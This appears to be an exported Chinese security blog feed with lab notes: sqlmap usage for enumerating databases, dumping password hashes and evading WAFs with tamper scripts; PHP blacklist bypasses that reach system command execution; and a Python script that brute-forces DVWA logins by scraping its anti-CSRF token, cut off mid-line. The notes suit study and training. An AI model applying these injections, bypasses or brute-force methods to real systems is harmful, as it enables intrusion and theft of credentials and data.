class="headerlink" title="union查询中的sql注入条件修改"></a>union查询中的sql注入条件修改</h1><p>–union-cols 改变注入的列数<br>–union-char 默认使用NULL查询，可以特殊指定查询（–union-char 123）<br>–union-from 指定from后指定的表名如–union-from =users</p><h1 id="注入文件xml学习"><a href="#注入文件xml学习" class="headerlink" title="注入文件xml学习"></a>注入文件xml学习</h1><p>参考链接：<a href="https://www.freebuf.com/column/161797.html" target="_blank" rel="noopener">https://www.freebuf.com/column/161797.html</a></p><pre><code class="hljs dts"><span class="hljs-params">&lt;test&gt;</span>  <span class="hljs-comment">//payload标题</span>        <span class="hljs-params">&lt;title&gt;</span>AND boolean-based blind - WHERE or HAVING clause<span class="hljs-params">&lt;/title&gt;</span>        <span class="hljs-comment">//paload注入类型</span>        <span class="hljs-params">&lt;stype&gt;</span><span class="hljs-number">1</span><span class="hljs-params">&lt;/stype&gt;</span>        <span class="hljs-comment">//payload发包级别</span>        <span class="hljs-params">&lt;level&gt;</span><span class="hljs-number">1</span><span class="hljs-params">&lt;/level&gt;</span>        <span class="hljs-comment">//风险等级指数</span>        <span class="hljs-params">&lt;risk&gt;</span><span class="hljs-number">1</span><span class="hljs-params">&lt;/risk&gt;</span>        <span class="hljs-params">&lt;clause&gt;</span><span class="hljs-number">1</span>,<span class="hljs-number">9</span><span class="hljs-params">&lt;/clause&gt;</span>        <span class="hljs-params">&lt;where&gt;</span><span class="hljs-number">1</span><span class="hljs-params">&lt;/where&gt;</span>        <span class="hljs-comment">//sql注入模板</span>        <span class="hljs-params">&lt;vector&gt;</span>AND [INFERENCE]<span class="hljs-params">&lt;/vector&gt;</span>        <span class="hljs-comment">//sql注入请求测试</span>        <span class="hljs-params">&lt;request&gt;</span>            <span class="hljs-params">&lt;payload&gt;</span>AND [RANDNUM]=[RANDNUM]<span class="hljs-params">&lt;/payload&gt;</span>        <span class="hljs-params">&lt;/request&gt;</span>        <span class="hljs-params">&lt;response&gt;</span>            <span class="hljs-params">&lt;comparison&gt;</span>AND [RANDNUM]=[RANDNUM1]<span class="hljs-params">&lt;/comparison&gt;</span>        <span class="hljs-params">&lt;/response&gt;</span>    <span class="hljs-params">&lt;/test&gt;</span></code></pre><h1 id="列出数据库信息-包含列出库表列"><a href="#列出数据库信息-包含列出库表列" class="headerlink" title="列出数据库信息(包含列出库表列)"></a>列出数据库信息(包含列出库表列)</h1><h2 id="–current-user-：会话用户查询"><a href="#–current-user-：会话用户查询" class="headerlink" title="–current-user ：会话用户查询"></a>–current-user ：会话用户查询</h2><h2 id="–current-db-当前数据库"><a href="#–current-db-当前数据库" class="headerlink" title="–current-db : 当前数据库"></a>–current-db : 当前数据库</h2><h2 id="–hostname-服务器主机名"><a href="#–hostname-服务器主机名" class="headerlink" title="–hostname : 服务器主机名"></a>–hostname : 服务器主机名</h2><h2 id="–is-dba-检测会话用户是否是数据库管理员"><a href="#–is-dba-检测会话用户是否是数据库管理员" class="headerlink" title="–is-dba : 检测会话用户是否是数据库管理员"></a>–is-dba : 检测会话用户是否是数据库管理员</h2><h2 id="–users-：-列出数据库管理系统用户"><a href="#–users-：-列出数据库管理系统用户" class="headerlink" title="–users ： 列出数据库管理系统用户"></a>–users ： 列出数据库管理系统用户</h2><h2 id="–passwords-列出并列出数据库管理员用户的密码hash"><a href="#–passwords-列出并列出数据库管理员用户的密码hash" class="headerlink" title="–passwords : 列出并列出数据库管理员用户的密码hash"></a>–passwords : 列出并列出数据库管理员用户的密码hash</h2><pre><code class="hljs routeros">database management<span class="hljs-built_in"> system users </span>password hashes:                                                                      [*] debian-sys-maint [1]:    password hash: <span class="hljs-number">*81F5E21E35407D884A6CD4A731AEBFB6AF209E1B</span>    clear-text password: root[*] root [2]:    password hash: <span class="hljs-number">*6036DEF7A88F5784569BDE19F070A5C60CE696E6</span>    password hash: <span class="hljs-number">*81F5E21E35407D884A6CD4A731AEBFB6AF209E1B</span>    clear-text password: root</code></pre><h2 id="–privileges-：列出数据库管理系统用户权限"><a href="#–privileges-：列出数据库管理系统用户权限" class="headerlink" title="–privileges ：列出数据库管理系统用户权限"></a>–privileges ：列出数据库管理系统用户权限</h2><h2 id="–roles-：列出数据库管理系统用户角色"><a href="#–roles-：列出数据库管理系统用户角色" class="headerlink" title="–roles ：列出数据库管理系统用户角色"></a>–roles ：列出数据库管理系统用户角色</h2><h2 id="列出除系统数据库以外的表"><a href="#列出除系统数据库以外的表" class="headerlink" title="列出除系统数据库以外的表"></a>列出除系统数据库以外的表</h2><p>sqlmap -u <a href="http://127.0.0.1/sqli-labs/Less-38/?id=1" target="_blank" rel="noopener">http://127.0.0.1/sqli-labs/Less-38/?id=1</a> –exclude-sysdbs –tables</p><h1 id="转存数据库表目"><a href="#转存数据库表目" class="headerlink" title="转存数据库表目"></a>转存数据库表目</h1><p>开关和选项：</p><pre><code class="hljs brainfuck">--<span class="hljs-comment">dump，</span><span class="hljs-literal">-</span><span class="hljs-comment">C，</span><span class="hljs-literal">-</span><span class="hljs-comment">T，</span><span class="hljs-literal">-</span><span class="hljs-comment">D，</span>--<span class="hljs-comment">start，</span>--<span class="hljs-comment">stop，</span>--<span class="hljs-comment">first，</span>--<span class="hljs-comment">last，</span>--<span class="hljs-comment">pivot</span><span class="hljs-literal">-</span><span class="hljs-comment">column和</span>--<span class="hljs-comment">where</span></code></pre><h1 id="运行自定义SQL语句"><a href="#运行自定义SQL语句" class="headerlink" title="运行自定义SQL语句"></a>运行自定义SQL语句</h1><p>选项和开关：<code>--sql-query和--sql-shell</code></p><pre><code class="hljs groovy">$ python sqlmap.py -u <span class="hljs-string">"http://192.168.136.131/sqlmap/mssql/get_int.php?id=1"</span> --\sql-query <span class="hljs-string">"SELECT 'foo'"</span> -v <span class="hljs-number">1</span>[...][<span class="hljs-string">hh:</span><span class="hljs-string">mm:</span><span class="hljs-number">14</span>] [INFO] fetching SQL SELECT query <span class="hljs-string">output:</span> <span class="hljs-string">'SELECT '</span>foo<span class="hljs-string">''</span>[<span class="hljs-string">hh:</span><span class="hljs-string">mm:</span><span class="hljs-number">14</span>] [INFO] <span class="hljs-string">retrieved:</span> fooSELECT <span class="hljs-string">'foo'</span>:    <span class="hljs-string">'foo'</span>$ python sqlmap.py -u <span class="hljs-string">"http://192.168.136.131/sqlmap/mssql/get_int.php?id=1"</span> --\sql-query <span class="hljs-string">"SELECT 'foo', 'bar'"</span> -v <span class="hljs-number">2</span>[...][<span class="hljs-string">hh:</span><span class="hljs-string">mm:</span><span class="hljs-number">50</span>] [INFO] fetching SQL SELECT query <span class="hljs-string">output:</span> <span class="hljs-string">'SELECT '</span>foo<span class="hljs-string">', '</span>bar<span class="hljs-string">''</span>[<span class="hljs-string">hh:</span><span class="hljs-string">mm:</span><span class="hljs-number">50</span>] [INFO] the SQL query provided has more than a field. sqlmap will now unpack it into distinct queries to be able to retrieve the output even <span class="hljs-keyword">if</span> we are going blind[<span class="hljs-string">hh:</span><span class="hljs-string">mm:</span><span class="hljs-number">50</span>] [DEBUG] <span class="hljs-string">query:</span> SELECT ISNULL(CAST((CHAR(<span class="hljs-number">102</span>)+CHAR(<span class="hljs-number">111</span>)+CHAR(<span class="hljs-number">111</span>)) AS VARCHAR(<span class="hljs-number">8000</span>)), (CHAR(<span class="hljs-number">32</span>)))[<span class="hljs-string">hh:</span><span class="hljs-string">mm:</span><span class="hljs-number">50</span>] [INFO] <span class="hljs-string">retrieved:</span> foo[<span class="hljs-string">hh:</span><span class="hljs-string">mm:</span><span class="hljs-number">50</span>] [DEBUG] performed <span class="hljs-number">27</span> queries <span class="hljs-keyword">in</span> <span class="hljs-number">0</span> seconds[<span class="hljs-string">hh:</span><span class="hljs-string">mm:</span><span class="hljs-number">50</span>] [DEBUG] <span class="hljs-string">query:</span> SELECT ISNULL(CAST((CHAR(<span class="hljs-number">98</span>)+CHAR(<span class="hljs-number">97</span>)+CHAR(<span class="hljs-number">114</span>)) AS VARCHAR(<span class="hljs-number">8000</span>)), (CHAR(<span class="hljs-number">32</span>)))[<span class="hljs-string">hh:</span><span class="hljs-string">mm:</span><span class="hljs-number">50</span>] [INFO] <span class="hljs-string">retrieved:</span> bar[<span class="hljs-string">hh:</span><span class="hljs-string">mm:</span><span class="hljs-number">50</span>] [DEBUG] performed <span class="hljs-number">27</span> queries <span class="hljs-keyword">in</span> <span class="hljs-number">0</span> secondsSELECT <span class="hljs-string">'foo'</span>, <span class="hljs-string">'bar'</span>:    <span class="hljs-string">'foo, bar'</span></code></pre><p>这里可以理解为解决特殊查询</p><h1 id="新用户运行可执行命令"><a href="#新用户运行可执行命令" class="headerlink" title="新用户运行可执行命令"></a>新用户运行可执行命令</h1><p>sqlmap –wizard</p><h1 id="搜索数据库常用参数整理"><a href="#搜索数据库常用参数整理" class="headerlink" title="搜索数据库常用参数整理"></a>搜索数据库常用参数整理</h1><pre><code class="hljs pgsql">-a, <span class="hljs-comment">--all           Retrieve everything</span>        检索所有，这是拖库的节奏啊    -b, <span class="hljs-comment">--banner        Retrieve DBMS banner</span>        检索数据库的一些标志性的信息，就是指纹这样子吧    <span class="hljs-comment">--current-user      Retrieve DBMS current user</span>        检索当前连接数据库的用户    <span class="hljs-comment">--current-db        Retrieve DBMS current database</span>        检索当前连接的数据库    <span class="hljs-comment">--hostname          Retrieve DBMS server hostname</span>        检索服务器的主机名    <span class="hljs-comment">--is-dba            Detect if the DBMS current user is DBA</span>        检测是不是dba，就是root权限咯    <span class="hljs-comment">--users             Enumerate DBMS users</span>        枚举数据库用户    <span class="hljs-comment">--passwords         Enumerate DBMS users password hashes</span>        枚举数据库用户的哈希值    <span class="hljs-comment">--privileges        Enumerate DBMS users privileges</span>        枚举数据库用户的权限    <span class="hljs-comment">--roles             Enumerate DBMS users roles</span>        枚举数据库用户的角色    <span class="hljs-comment">--dbs               Enumerate DBMS databases</span>        枚举数据库有哪些    <span class="hljs-comment">--tables            Enumerate DBMS database tables</span>        枚举数据表名    <span class="hljs-comment">--columns           Enumerate DBMS database table columns</span>        枚举列名    <span class="hljs-comment">--schema            Enumerate DBMS schema</span>        这个测试过，将所有的数据库的表的基本信息都枚举了，有哪些列，列的数据类型，具体数据就没有枚举    <span class="hljs-comment">--count             Retrieve number of entries for table(s)</span>        枚举表格个数    <span class="hljs-comment">--dump              Dump DBMS database table entries</span>        输出数据库表的数据    <span class="hljs-comment">--dump-all          Dump all DBMS databases tables entries</span>        输出所有    <span class="hljs-comment">--search            Search column(s), table(s) and/or database name(s)</span>        查找特定的列名，表名或数据库名，配合下面的-D,-C,-T    <span class="hljs-comment">--comments          Retrieve DBMS comments</span>        枚举数据库的注释    -D DB               DBMS <span class="hljs-keyword">database</span> <span class="hljs-keyword">to</span> enumerate        指定数据库名    -T TBL              DBMS <span class="hljs-keyword">database</span> <span class="hljs-keyword">table</span>(s) <span class="hljs-keyword">to</span> enumerate        指定表名    -C COL              DBMS <span class="hljs-keyword">database</span> <span class="hljs-keyword">table</span> <span class="hljs-keyword">column</span>(s) <span class="hljs-keyword">to</span> enumerate        指定列名    -X EXCLUDECOL       DBMS <span class="hljs-keyword">database</span> <span class="hljs-keyword">table</span> <span class="hljs-keyword">column</span>(s) <span class="hljs-keyword">to</span> <span class="hljs-keyword">not</span> enumerate        指定不枚举那个列    -U <span class="hljs-keyword">USER</span>             DBMS <span class="hljs-keyword">user</span> <span class="hljs-keyword">to</span> enumerate        枚举用户，但单独用这个参数感觉没什么用啊，这个可能要看源码才能解决了，估计要配合其他参数    <span class="hljs-comment">--exclude-sysdbs    Exclude DBMS system databases when enumerating tables</span>        枚举时排除系统的数据库    <span class="hljs-comment">--pivot-column=P..  Pivot column name</span>        以某一列为核心？这个用过没感觉出什么用    <span class="hljs-comment">--where=DUMPWHERE   Use WHERE condition while table dumping</span>        使用<span class="hljs-keyword">where</span>调试限制<span class="hljs-keyword">table</span>的输出    <span class="hljs-comment">--start=LIMITSTART  First query output entry to retrieve</span>        指定开始从第几行开始输出，如<span class="hljs-comment">--start=3，前两行就不输出了</span>    <span class="hljs-comment">--stop=LIMITSTOP    Last query output entry to retrieve</span>        指定从第几行开始停止输出    <span class="hljs-comment">--first=FIRSTCHAR   First query output word character to retrieve</span>        指定只输出第几个字符开始输出，盲注才有效，亲测    <span class="hljs-comment">--last=LASTCHAR     Last query output word character to retrieve</span>        指定只输出第几个字符停止输出，盲注才有效，亲测，跟上面的配合指定范围，        如 ：<span class="hljs-comment">--first 3 --last 5  只输出3到5位置的字符</span>    <span class="hljs-comment">--sql-query=QUERY   SQL statement to be executed</span>        指定执行我们的<span class="hljs-keyword">sql</span>语句    <span class="hljs-comment">--sql-shell         Prompt for an interactive SQL shell</span>        返回一个<span class="hljs-keyword">sql</span>的shell    <span class="hljs-comment">--sql-file=SQLFILE  Execute SQL statements from given file(s)</span>        从文件中读取执行<span class="hljs-keyword">sql</span>语句 -D DB               要进行枚举的指定数据库名   -T TBL              DBMS数据库表枚举   -C COL             DBMS数据库表列枚举   -X EXCLUDECOL     DBMS数据库表不进行枚举./sqlmap.py sqlmap -u "http://www.xxx.com" //查是否有注入，一些基本信息  ./sqlmap.py -u "http://www.xxx.com" <span class="hljs-comment">--dbs //枚举数据库</span>./sqlmap.py sqlmap -u "http://www.xxx.com" <span class="hljs-comment">--tables //表名枚举</span>./sqlmap.py sqlmap -u "http://www.xxx.com" <span class="hljs-comment">--columns -T 数据库表名 //字段枚举</span>./sqlmap.py sqlmap -u "http://www.xxx.com" <span class="hljs-comment">--dump -T 数据库表名 -C "字段1，字段2，字段3" //dump</span>./sqlmap.py -u "http://www.xxx.com" <span class="hljs-comment">--dump -D 数据库名 -T 表名 -C "字段名1，字段名2，字段名3" //dump</span></code></pre><h1 id="–temper选择总结"><a href="#–temper选择总结" class="headerlink" title="–temper选择总结"></a>–temper选择总结</h1><p>参考链接：<a href="https://www.freebuf.com/sectool/179035.html" target="_blank" rel="noopener">https://www.freebuf.com/sectool/179035.html</a><br>sqlmap版本当前为1.2.7.20，共有57个tamper脚本，与1.0版本相比新增了19个脚本。</p><pre><code class="hljs angelscript">序号  脚本名称    注释<span class="hljs-number">1</span>   <span class="hljs-number">0x2c</span>har 将每个编码后的字符转换为等价表达<span class="hljs-number">2</span>   apostrophemask  单引号替换为Utf8字符<span class="hljs-number">3</span>   apostrophenullencode    替换双引号为%<span class="hljs-number">00</span>%<span class="hljs-number">27</span><span class="hljs-number">4</span>   appendnullbyte  有效代码后添加%<span class="hljs-number">00</span><span class="hljs-number">5</span>   base64encode    使用base64编码<span class="hljs-number">6</span>   between 比较符替换为between<span class="hljs-number">7</span>   bluecoat    空格替换为随机空白字符，等号替换为like<span class="hljs-number">8</span>   chardoubleencode    双url编码<span class="hljs-number">9</span>   charencode  将url编码<span class="hljs-number">10</span>  charunicodeencode   使用unicode编码<span class="hljs-number">11</span>  charunicodeescape   以指定的payload反向编码未编码的字符<span class="hljs-number">12</span>  commalesslimit  改变limit语句的写法<span class="hljs-number">13</span>  commalessmid    改变mid语句的写法<span class="hljs-number">14</span>  commentbeforeparentheses    在括号前加内联注释<span class="hljs-number">15</span>  concat2concatws 替换CONCAT为CONCAT_WS<span class="hljs-number">16</span>  equaltolike 等号替换为like<span class="hljs-number">17</span>  escapequotes    双引号替换为\\\\<span class="hljs-number">18</span>  greatest    大于号替换为greatest<span class="hljs-number">19</span>  halfversionedmorekeywords   在每个关键字前加注释<span class="hljs-number">20</span>  htmlencode  html编码所有非字母和数字的字符<span class="hljs-number">21</span>  ifnull2casewhenisnull   改变ifnull语句的写法<span class="hljs-number">22</span>  ifnull2ifisnull 替换ifnull为<span class="hljs-keyword">if</span>(isnull(A))<span class="hljs-number">23</span>  informationschemacomment    标示符后添加注释<span class="hljs-number">24</span>  least   替换大于号为least<span class="hljs-number">25</span>  lowercase   全部替换为小写值<span class="hljs-number">26</span>  modsecurityversioned    空格替换为查询版本的注释<span class="hljs-number">27</span>  modsecurityzeroversioned    添加完整的查询版本的注释<span class="hljs-number">28</span>  multiplespaces  添加多个空格<span class="hljs-number">29</span>  nonrecursivereplacement 替换预定义的关键字<span class="hljs-number">30</span>  overlongutf8    将所有字符转义为utf8<span class="hljs-number">31</span>  overlongutf8more    以指定的payload转换所有字符<span class="hljs-number">32</span>  percentage  每个字符前添加%<span class="hljs-number">33</span>  plus2concat 将加号替换为concat函数<span class="hljs-number">34</span>  plus2fnconcat   将加号替换为ODBC函数&#123;fn CONCAT()&#125;<span class="hljs-number">35</span>  randomcase  字符大小写随机替换<span class="hljs-number">36</span>  randomcomments  <span class="hljs-comment">/**/</span>分割关键字<span class="hljs-number">37</span>  securesphere    添加某字符串<span class="hljs-number">38</span>  sp_password 追加sp_password字符串<span class="hljs-number">39</span>  space2comment   空格替换为<span class="hljs-comment">/**/</span><span class="hljs-number">40</span>  space2dash  空格替换为–加随机字符<span class="hljs-number">41</span>  space2hash  空格替换为#加随机字符<span class="hljs-number">42</span>  space2morecomment   空格替换为<span class="hljs-comment">/**_**/</span><span class="hljs-number">43</span>  space2morehash  空格替换为#加随机字符及换行符<span class="hljs-number">44</span>  space2mssqlblank    空格替换为其他空符号<span class="hljs-number">45</span>  space2mssqlhash 空格替换为%<span class="hljs-number">23</span>%<span class="hljs-number">0</span>A<span class="hljs-number">46</span>  space2mysqlblank    空格替换为其他空白符号<span class="hljs-number">47</span>  space2mysqldash 空格替换为–%<span class="hljs-number">0</span>A<span class="hljs-number">48</span>  space2plus  空格替换为加号<span class="hljs-number">49</span>  space2randomblank   空格替换为备选字符集中的随机字符<span class="hljs-number">50</span>  symboliclogical AND和OR替换为&amp;&amp;和||<span class="hljs-number">51</span>  unionalltounion union all select替换为union select<span class="hljs-number">52</span>  unmagicquotes   宽字符绕过GPC<span class="hljs-number">53</span>  uppercase   全部替换为大写值<span class="hljs-number">54</span>  varnish 添加HTTP头<span class="hljs-number">55</span>  versionedkeywords   用注释封装每个非函数的关键字<span class="hljs-number">56</span>  versionedmorekeywords   使用注释绕过<span class="hljs-number">57</span>  xforwardedfor   添加伪造的HTTP头</code></pre><pre><code class="hljs angelscript">【MySQL】版本  可用tamper编号  脚本名称<span class="hljs-number">4</span>/<span class="hljs-number">5.0</span>/<span class="hljs-number">5.5</span>   <span class="hljs-number">1</span>   <span class="hljs-number">0x2c</span>har<span class="hljs-number">6</span>   between<span class="hljs-number">9</span>   charencode<span class="hljs-number">16</span>  concat2concatws<span class="hljs-number">18</span>  greatest<span class="hljs-number">24</span>  least<span class="hljs-number">25</span>  lowercase<span class="hljs-number">35</span>  randomcase<span class="hljs-number">39</span>  space2comment<span class="hljs-number">49</span>  space2randomblank<span class="hljs-number">53</span>  uppercase<span class="hljs-number">5.1</span> <span class="hljs-number">7</span>   bluecoat<span class="hljs-number">46</span>  space2mysqlblank<span class="hljs-number">5.0</span>/<span class="hljs-number">5.5</span> <span class="hljs-number">12</span>  commalesslimit<span class="hljs-number">13</span>  commalessmid<span class="hljs-number">21</span>  ifnull2casewhenisnull<span class="hljs-number">22</span>  ifnull2ifisnull<span class="hljs-number">42</span>  space2morecomment<span class="hljs-number">5.0</span> <span class="hljs-number">15</span>  concat2concatws<span class="hljs-number">26</span>  modsecurityversioned<span class="hljs-number">27</span>  modsecurityzeroversioned<span class="hljs-number">4.0</span>/<span class="hljs-number">5.0</span> <span class="hljs-number">41</span>  space2hash<span class="hljs-number">5.1</span><span class="hljs-number">.56</span>  <span class="hljs-number">10</span>  charunicodeencode<span class="hljs-number">5.1</span><span class="hljs-number">.56</span>/<span class="hljs-number">5.5</span><span class="hljs-number">.11</span>   <span class="hljs-number">32</span>  percentage<span class="hljs-number">56</span>  versionedmorekeywords<span class="hljs-number">4.0</span><span class="hljs-number">.18</span>/<span class="hljs-number">5.0</span><span class="hljs-number">.22</span>   <span class="hljs-number">19</span>  halfversionedmorekeywords<span class="hljs-number">4.0</span><span class="hljs-number">.18</span>/<span class="hljs-number">5.1</span><span class="hljs-number">.56</span>/<span class="hljs-number">5.5</span><span class="hljs-number">.11</span>    <span class="hljs-number">55</span>  versionedkeywords<span class="hljs-number">5.1</span><span class="hljs-number">.41</span>  <span class="hljs-number">43</span>  space2morehash未指定版本   <span class="hljs-number">14</span>  commentbeforeparentheses<span class="hljs-number">40</span>  space2dash<span class="hljs-number">45</span>  space2mssqlhash<span class="hljs-number">47</span>  space2mysqldash</code></pre><p>参考链接：<a href="https://github.com/sqlmapproject/sqlmap/wiki/Usage" target="_blank" rel="noopener">https://github.com/sqlmapproject/sqlmap/wiki/Usage</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>SQL注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP之GET传参黑名单绕过</title>
    <link href="/2019/02/20/PHP%E4%B9%8BGET%E4%BC%A0%E5%8F%82%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87/"/>
    <url>/2019/02/20/PHP%E4%B9%8BGET%E4%BC%A0%E5%8F%82%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>整理一下url GET传参绕过黑名单限制，持续补充应该CTF时候可以用的上。</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://www.anquanke.com/post/id/168667" target="_blank" rel="noopener">https://www.anquanke.com/post/id/168667</a></p><h1 id="黑名单代码DEMO"><a href="#黑名单代码DEMO" class="headerlink" title="黑名单代码DEMO"></a>黑名单代码DEMO</h1><p><img src="./1.png" srcset="/img/loading.gif" alt=""></p><h1 id="PHP转义绕过"><a href="#PHP转义绕过" class="headerlink" title="PHP转义绕过"></a>PHP转义绕过</h1><p>以Unicode表示的<code>\u{[0–9A-Fa-f]+}</code>字符，会输出为<code>UTF-8</code>字符串（自<code>PHP 7.0.0</code>引入该功能）<br>在PHP&gt;7 可以采用可变函数+十六进制绕过黑名单<br><img src="./2.png" srcset="/img/loading.gif" alt=""></p><h2 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h2><p>这种技术并不适用于所有PHP函数，可变函数不能用于诸如<code>echo、print、unset()、isset()、empty()、include</code>以及<code>require</code>等语言结构，用户需要使用自己的封装函数，才能以可变函数方式使用这些结构</p><h1 id="改进用户输入过滤-绕过黑名单"><a href="#改进用户输入过滤-绕过黑名单" class="headerlink" title="改进用户输入过滤,绕过黑名单"></a>改进用户输入过滤,绕过黑名单</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>PHP表示字符串方法<br><img src="./3.png" srcset="/img/loading.gif" alt=""></p><h2 id="使用字符串拼接em"><a href="#使用字符串拼接em" class="headerlink" title="使用字符串拼接em"></a>使用字符串拼接em</h2><p>(sy.(st).em)(whoami)<br><code>http://192.168.43.195/waf.php?code=(sy.(st).em)(whoami);</code><br>条件：PHP&gt;7.0<br><img src="./4.png" srcset="/img/loading.gif" alt=""></p><h2 id="多GET赋值"><a href="#多GET赋值" class="headerlink" title="多GET赋值"></a>多GET赋值</h2><p>条件：PHP&gt;5.2<br><code>http://192.168.43.195/waf.php?a=system&amp;b=whoami&amp;code=$_GET[a]($_GET[b]);</code><br><img src="./5.png" srcset="/img/loading.gif" alt=""><br><img src="./6.png" srcset="/img/loading.gif" alt=""><br><img src="./7.png" srcset="/img/loading.gif" alt=""></p><h2 id="get-defined-functions"><a href="#get-defined-functions" class="headerlink" title="get_defined_functions"></a>get_defined_functions</h2><p>返回所有已定义函数的数组<br><code>http://192.168.43.195/waf.php?code=print_r(get_defined_functions()[internal]); | grep &#39;system&#39;</code></p><blockquote><blockquote><p>[373] =&gt; system</p></blockquote></blockquote><p><code>http://192.168.43.195/waf.php?code=get_defined_functions()[internal][373](whoami);</code><br><img src="./8.png" srcset="/img/loading.gif" alt=""></p><h2 id="字符串数组（需要用到FILE）"><a href="#字符串数组（需要用到FILE）" class="headerlink" title="字符串数组（需要用到FILE）"></a>字符串数组（需要用到<strong>FILE</strong>）</h2><p><code>var_dump(file_get_contents(substr(__FILE__,0,-19)))</code><br>这里不能传入常量，我们对’/‘ 过滤，所以直接输入绝对路径无法显示源代码<br><img src="./9.png" srcset="/img/loading.gif" alt=""><br><img src="./10.png" srcset="/img/loading.gif" alt=""></p>]]></content>
    
    
    
    <tags>
      
      <tag>WEB安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DVWA之Anti CSRF分析利用(python3+Brute Password)</title>
    <link href="/2019/02/20/DVWA%E4%B9%8BAnti-CSRF%E5%88%86%E6%9E%90%E5%88%A9%E7%94%A8/"/>
    <url>/2019/02/20/DVWA%E4%B9%8BAnti-CSRF%E5%88%86%E6%9E%90%E5%88%A9%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>耍DVWA一直碰到Anti-CSRF，受不了就仔细看看源码，学习一番。发现竟然有这么大个BUG。</p><h1 id="Begin"><a href="#Begin" class="headerlink" title="Begin"></a>Begin</h1><h2 id="NOTICE"><a href="#NOTICE" class="headerlink" title="NOTICE"></a>NOTICE</h2><p>index.php&gt;&gt;点击submit之后跳转脚本login.php中<br>主要方法分析:</p><h2 id="dvwaPage-inc-php"><a href="#dvwaPage-inc-php" class="headerlink" title="dvwaPage.inc.php"></a>dvwaPage.inc.php</h2><p>generateSessionToken()方法&gt;&gt;通过当前时间生成一个session_ID,转MD5,储存在服务端<br><img src="./1.png" srcset="/img/loading.gif" alt=""><br>generateSessionToken()方法&gt;&gt;判断当前界面是否存在session_token，若存在销毁上一个sessionID 并创建一个新的session_token。不存在直接创建session_token<br><img src="./2.png" srcset="/img/loading.gif" alt=""></p><h2 id="Anti-CSRF执行流程"><a href="#Anti-CSRF执行流程" class="headerlink" title="Anti-CSRF执行流程"></a>Anti-CSRF执行流程</h2><h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><p>user_token的提交是怎么被赋值?session_token和user_token是怎么验证相等?<br>问题一:查看源代码如下，$session[‘session_token’]放置于标签name=’’user_token中。<br>在login.php的验证执行，通过reuqests[‘user_token’]方式提取name=’user_token’对应的value值<br>问题二:在运行的login.php脚本中调用checkToken方法检验session_token和user_token值是否相等<br><img src="./3.png" srcset="/img/loading.gif" alt=""><br><img src="./4.png" srcset="/img/loading.gif" alt=""></p><p>每次访问或跳转至index.php时会调用dvwaPage.inic.php（写有Token Function的文件）。<br><img src="./5.png" srcset="/img/loading.gif" alt=""></p><h2 id="token-user成长历程"><a href="#token-user成长历程" class="headerlink" title="token_user成长历程"></a>token_user成长历程</h2><ol><li>index.php中&gt;&gt;检查页面是否已存在session_token</li><li>index.php中&gt;&gt;存在，销毁session_token，并创建一个新的session_token</li><li>index.php中&gt;&gt;执行tokenFied()方法，将session_token放置标签中(可以在index.php中审查源码可以看到session_token值)<br>可以看出这里存在BUG，爆破密码可以先提取网页源码中的user_Token进行payload构建。再爆破密码</li><li>login.php&gt;&gt;验证user_token是否与脚本中的session_token相等<br><img src="./6.png" srcset="/img/loading.gif" alt=""><br><img src="./7.png" srcset="/img/loading.gif" alt=""><br><img src="./6.png" srcset="/img/loading.gif" alt=""></li></ol><h2 id="Brute-password-High"><a href="#Brute-password-High" class="headerlink" title="Brute password(High)"></a>Brute password(High)</h2><pre><code class="hljs processing"><span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> refrom bs4 <span class="hljs-keyword">import</span> BeautifulSoupdef getToken(url,header):<span class="hljs-keyword">try</span>:r = requests.<span class="hljs-built_in">get</span>(url,headers=header)<span class="hljs-built_in">print</span> (r.status_code)<span class="hljs-built_in">print</span> (len(r.<span class="hljs-built_in">text</span>))r.raise_for_status()r.encoding=r.apparent_encodingsoup = BeautifulSoup(r.<span class="hljs-built_in">text</span>,<span class="hljs-string">'html.parser'</span>)token = soup.find_all(<span class="hljs-string">'input'</span>)str1 = <span class="hljs-built_in">str</span>(token[<span class="hljs-number">3</span>])new_token = str1[<span class="hljs-number">46</span>:<span class="hljs-number">-11</span>]<span class="hljs-keyword">return</span> new_tokenexcept:<span class="hljs-keyword">return</span> <span class="hljs-string">""</span>header=&#123;<span class="hljs-string">'Host'</span>:<span class="hljs-string">'192.168.43.195'</span>,<span class="hljs-string">'Upgrade-Insecure-Requests'</span>: <span class="hljs-string">'1'</span>,<span class="hljs-string">'User-Agent'</span>:<span class="hljs-string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36'</span>,<span class="hljs-string">'Accept'</span>: <span class="hljs-string">'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'</span>,<span class="hljs-string">'Referer'</span>: <span class="hljs-string">'http://192.168.43.195/DVWA/vulnerabilities/brute/index.php'</span>,<span class="hljs-string">'Accept-Language'</span>: <span class="hljs-string">'zh-CN,zh;q=0.9'</span>,<span class="hljs-string">'Cookie'</span>: <span class="hljs-string">'security=high; PHPSESSID=adf974919653a77c8befadca017f92e7'</span>&#125;url = <span class="hljs-string">'http://192.168.43.195/DVWA/vulnerabilities/brute/index.php'</span>i=<span class="hljs-number">0</span>str3=<span class="hljs-string">''</span>new_token=getToken(url,header)<span class="hljs-keyword">for</span> <span class="hljs-built_in">line</span> in <span class="hljs-built_in">open</span>(<span class="hljs-string">"D://rkolin.txt"</span>):requal =<span class="hljs-string">'http://192.168.43.195/DVWA/vulnerabilities/brute/'</span>+<span class="hljs-string">"?username=admin&amp;password="</span>+<span class="hljs-built_in">line</span>.strip()+<span 